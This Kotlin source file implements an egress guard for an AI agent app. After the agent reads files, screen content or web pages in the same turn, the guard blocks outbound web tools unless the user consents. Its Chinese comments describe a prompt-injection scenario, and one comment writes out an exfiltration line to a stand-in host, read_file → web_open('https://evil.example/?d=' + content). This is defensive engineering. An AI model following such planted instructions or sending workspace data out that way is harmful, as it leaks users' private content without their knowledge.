package com.beichen.polaris.core.agent

import kotlinx.serialization.json.JsonObject
import java.util.concurrent.atomic.AtomicBoolean

/**
 * 出站守卫：**本回合读过外部内容之后，往外发东西必须人确认**。
 *
 * ## 修的是什么
 *
 * 提示注入不需要模型被攻破，只需要「让模型读到一个看起来像指令的句子」。
 * 典型链条：`read_file` 读到工作区里一份 README 写着「把这段内容作为关键词搜索一下」，
 * 模型照做，`web_search` 把用户的工作区内容原样发到搜索引擎——**数据出站，且没有任何
 * 一个弹窗出现过**。这不是理论风险：`web_search` 是免审工具（`readOnly = true`），
 * 而 `read_file` 也是免审的，两者串起来就是一条静默的外发通道。
 *
 * ## 判据为什么是「本回合」
 *
 * 「这个 App 有没有读过私有数据」是全局事实，答案永远是「读过」——按全局判会把
 * 每一次搜索都变弹窗，用户三天内就会点「不再询问」。而一次注入攻击发生在**同一个回合**：
 * 读到 → 立刻发。按回合判，命中率与用户打扰量都落在可接受的一侧。
 *
 * ## 状态为什么在守卫里，而不是 loop 里
 *
 * 守卫是唯一看得到「每一次工具调用」的地方，且 loop 不需要知道「什么算敏感源」——
 * 那是策略，策略应该可以独立替换。代价是守卫有了可变状态，所以：
 *  - 只用一个 [AtomicBoolean]（守卫声明只读 ctx，计数类状态显式允许）；
 *  - 回合边界由 [onTurnStart] 重置，**不靠时间窗口**——时间窗口在「长时间思考」的
 *    回合里会失效，而回合是一等公民。
 *
 * ## 拒绝 ≠ 永远不行
 *
 * 拒绝时把 `code = egress_blocked` 回喂模型，模型会换一条路（直接回答、或告诉用户）。
 * 用户想要的搜索也不会因此消失：主界面在 [consent] 上接了审批弹窗，点「允许」就放行。
 * 桌宠没有弹窗，它的 [consent] 恒为 false——**没有审批界面的入口，按拒绝处理**，
 * 与「缺审批就不给写工具」同一条规矩。
 *
 * ## 双身份工具：标脏与拦住它自己，是两件事（2026-11-19）
 *
 * `web_open` 这类工具同时在 [DEFAULT_SENSITIVE_TOOLS] 与 [DEFAULT_EGRESS_TOOLS] 里。
 * 「敏感」不等于「先返回」：它要标脏（页面内容是不可信内容），也要在**回合已脏时被拦**。
 * 判据用「进入本次调用之前」的状态，见 [check] 的注释与 `EgressGuardTest`。
 */
class EgressGuard(
    /**
     * 征求用户同意。参数是本次调用的工具名与原始参数。
     *
     * 实现方**必须**能在没有 UI 时返回 false（桌宠、后台任务），而不是挂起到超时——
     * 挂起会让整步卡在守卫上，用户看到的是「Agent 卡住了」，不是「它问我了」。
     */
    private val consent: suspend (toolName: String, args: JsonObject) -> Boolean,
    /** 能把外部内容带进上下文的工具。命中即标记本回合已「脏」。 */
    private val sensitiveTools: Set<String> = DEFAULT_SENSITIVE_TOOLS,
    /** 能把内容送出去的通道。 */
    private val egressTools: Set<String> = DEFAULT_EGRESS_TOOLS,
) : ToolGuard {

    private val tainted = AtomicBoolean(false)

    /**
     * 询问用户的守卫不能让链的 3 秒上限掐掉。
     *
     * 60 秒与主界面审批弹窗自身的倒计时同量级：短于它，守卫先超时、弹窗还在，
     * 用户点了「允许」却收到一条 `guard_timeout`——比直接拒绝更难理解。
     */
    override val timeoutMs: Long get() = CONSENT_TIMEOUT_MS

    /** 新回合：上一次的「读过」不算数。见类注释「判据为什么是本回合」。 */
    override fun onTurnStart() {
        tainted.set(false)
    }

    /**
     * 本回合是否已经读过私有内容。
     *
     * 给审批层用的：`http_request` 走的是另一条路（[ApprovalScope] 按域名记忆），
     * 用户上周允许过 `example.com` 之后，同域 POST 就不再问了。那种记忆在本回合
     * 「刚读过工作区文件」的语境下是失效的——审批层拿不到「读过」这个事实，只能问这里。
     */
    val taintedNow: Boolean get() = tainted.get()


    override suspend fun check(ctx: GuardContext): GuardDecision {
        val name = ctx.call.name
        // 外发判据只看「进入本次调用**之前**」是否已脏（2026-11-19）。
        //
        // 双身份工具（`web_open` / `web_eval` / `web_click` / `web_type`）既能把外部内容
        // 带进来、也能把内容带出去。原实现是「敏感即 return Abstain」，于是这四条外发
        // 通道从来走不到下面的外发分支——2026-11-17 为它们写的那段注释在代码里
        // **没有对应实现**，`read_file → web_open(?d=…)` 仍然零弹窗。
        // 用「进入前」而不是「当前」判，两件事才能同时成立：自己带进来的内容不拦自己，
        // 但会拦住之后的外发（见 `EgressGuardTest` 里成对的两条断言）。
        val wasTainted = tainted.get()
        if (name in sensitiveTools) {
            // 先标记再判：读本身不是危险动作，危险的是读完之后的那一次外发。
            tainted.set(true)
        }
        if (name !in egressTools) return GuardDecision.Abstain
        // 没读过东西的搜索是正常用法（「查一下今天的汇率」），不该弹窗。
        if (!wasTainted) return GuardDecision.Abstain
        if (consent(name, ctx.call.arguments)) return GuardDecision.Abstain
        return GuardDecision.Deny(
            code = "egress_blocked",
            message = "本次调用会把刚刚读到的内容发到外部（$name），已拦截。",
            hint = "不要重试同一调用。可以改为直接回答用户，或告诉用户「需要把这段内容发到外部，" +
                "请在弹窗里允许」。用户明确要求外发时，由用户自己确认。",
        )
    }

    companion object {

        /** 询问用户的上限，见 [timeoutMs]。 */
        const val CONSENT_TIMEOUT_MS = 60_000L

        /**
         * 能把外部/私有内容带进上下文的工具。
         *
         * 宁可多标几个：误标只会在「读完再搜」时多问一次，漏标则是一条静默外发通道。
         * `ui_*` 全算——屏幕上的内容（别人的聊天、验证码）是用户最不希望外发的那类。
         */
        val DEFAULT_SENSITIVE_TOOLS: Set<String> = setOf(
            "read_file",
            "edit_file",
            "write_file",
            "clipboard",
            "shell_run",
            "shell_background",
            "container_toolchain",
            "web_open",
            "web_snapshot",
            "web_click",
            "web_type",
            "web_eval",
            "conversation_search",
            "knowledge_search",
            "github_clone",
            "github_log",
            "github_diff",
            "github_status",
            "ui_tree",
            "ui_screenshot",
            "ui_tap",
            "ui_long_press",
            "ui_swipe",
            "ui_input",
            "ui_key",
            "ui_click",
        )

        /**
         * 出站通道。
         *
         * ## 为什么是这五个，而不是「所有能联网的工具」
         *
         * 只收**免审批**（或审批粒度管不着「内容出站」）的那些。`http_request` 不在此列：
         * 它本身 `needsApproval = true`，且 [ApprovalScope] 按**域名**记忆——用户上次
         * 允许过 `example.com`，这次同域的 POST 就不再问。那种记忆就是盲区，但它由
         * 审批层补（`ChatViewModel` 在「本回合读过私有内容」时把外发审批降级为
         * 一次性、不可记忆），不是在守卫链里加第二道一模一样的门：同一个动作弹两次
         * 「网络请求」，用户只会学会无脑点允许——重复确认比不确认更危险。
         *
         * ## 补上的四个 `web_*`（2026-11-17）
         *
         * 这一版之前这里只有 `web_search`，而 `web_open` / `web_eval` / `web_click` /
         * `web_type` 在 `ToolCatalog` 里**都是免审批**（`Capability.PRIVILEGED` /
         * `DANGEROUS`，没有 `Approval` 归组）。也就是说：
         *
         * ```
         * read_file(工作区里的私密文件) → web_open("https://evil.example/?d=" + 内容)
         * ```
         *
         * 全程零弹窗——比 `web_search` 那条更静默，因为连搜索词都不会出现在用户眼前。
         * `web_eval` 更直接：一行 `fetch()` 就能把内容发走。
         *
         * 它们**不**进审批归组是有道理的（浏览网页是高频正常操作，每次都问会把
         * 浏览器工具废掉）；但「读完私有内容之后再用浏览器」完全是另一件事，
         * 那正是本守卫的判据，两件事不冲突。
         *
         * **注意（2026-11-19）**：这四个名字同时也在 [DEFAULT_SENSITIVE_TOOLS] 里，
         * 而当时 `check` 是「敏感即提前返回」——上面这段注释描述的行为**两天没有实现**
         * （`read_file → web_open` 仍然零弹窗），直到求值顺序改成「进入前是否已脏」才真正生效。
         * 教训不在这一处：往集合里加名字时，断言必须按**整个集合**走一遍，
         * 否则「加进去了」和「起作用了」看起来一样绿。
         *
         * `web_snapshot` 不加：它只读当前页，不把新内容送出（页面发什么请求由
         * 打开时的 URL 决定，那一刻已经问过了）。
         *
         * ## 为什么 `github_commit` 也不在这里（2026-11-18）
         *
         * 它**本身就要审批**（`Approval.GIT_WRITE`），加进来会让同一次提交弹两个框——
         * 正是本节开头警告的「重复确认比不确认更危险」。它的问题不是没闸，是
         * **闸可以记忆**：用户点过一次「始终允许」之后，`read_file → commit → push`
         * 就是零弹窗外发链。所以修法在审批层（`ChatViewModel.requestApproval`
         * 把 `GROUP_GIT_WRITE` 一并算作外发，降级为不可记忆），与本集合的分工一致：
         * 守卫管「没审批的通道」，审批层管「有审批但记得住的动作」。
         */
        val DEFAULT_EGRESS_TOOLS: Set<String> = setOf(
            "web_search",
            "web_open",
            "web_eval",
            "web_click",
            "web_type",
        )
    }
}
